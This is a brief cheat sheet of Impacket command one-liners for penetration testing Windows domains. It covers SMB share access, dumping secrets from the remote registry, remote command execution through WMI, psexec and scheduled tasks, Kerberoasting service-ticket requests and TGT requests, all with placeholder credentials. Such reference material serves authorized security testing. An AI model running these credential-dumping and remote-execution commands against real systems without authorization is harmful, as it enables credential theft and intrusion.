# Impacket

Frequently used Impacket one-liners.

### SMB shares

```bash
smbclient.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** SMB, Shares

### Remote registry secrets

```bash
secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Credentials, Remote Registry

### WMI shell

```bash
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** WMI, Execution

### SMB service execution

```bash
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** SMB, Execution

### Scheduled task execution

```bash
atexec.py <DOMAIN>/<USER>:<PASSWORD>@<HOST> "whoami"
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Task Scheduler, Execution

### Request service ticket

```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, SPN

### Request TGT

```bash
getTGT.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, TGT

